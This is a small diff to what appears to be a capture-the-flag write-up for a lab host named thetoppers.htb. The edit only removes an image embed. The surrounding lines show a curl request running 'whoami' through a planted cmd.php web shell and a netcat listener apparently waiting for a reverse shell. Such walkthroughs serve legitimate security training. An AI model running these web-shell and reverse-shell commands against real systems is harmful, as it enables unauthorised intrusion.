@@ -137,7 +137,6 @@ curl http://thetoppers.htb/cmd.php?cmd=whoami
 ```bash
 nc -nlvp 9000
 ```
-![[Pasted image 20250312120135.png]]
 ![](/img2/Pasted%20image%2020250312120309.png)
 
 ## Tasks
